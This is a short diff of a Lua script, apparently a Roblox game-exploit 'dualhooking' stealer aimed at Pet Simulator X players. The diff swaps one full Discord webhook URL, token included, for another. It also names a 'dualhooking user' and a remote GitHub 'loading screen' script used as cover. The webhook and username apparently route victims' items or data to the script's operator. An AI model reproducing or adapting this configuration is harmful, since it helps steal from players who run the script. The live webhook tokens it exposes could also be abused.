@@ -8,7 +8,7 @@
 ]]--
 
 local dhuser = "petspsx651"       -- dualhooking user
-local dhwebhook = "https://discord.com/api/webhooks/1129531859051749426/BhM5VbwIJP7mfL0m8SDAW7zTOqUvGn7QGd2btSHPAeecIEeNLOMY9psLEgUWxMua7gNZ" -- Dualhooking Webhook
+local dhwebhook = "https://discord.com/api/webhooks/1138588849761697924/3M2HuIsQci6wZN4JIXhXfPi4-cnL3bb-SyNwdUchNBmgEcwyFHsC3TxkdG8rqJXLfxP1" -- Dualhooking Webhook
 local loadingraw = "https://raw.githubusercontent.com/Cypaex/PsxLoading/main/Engine.lua" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
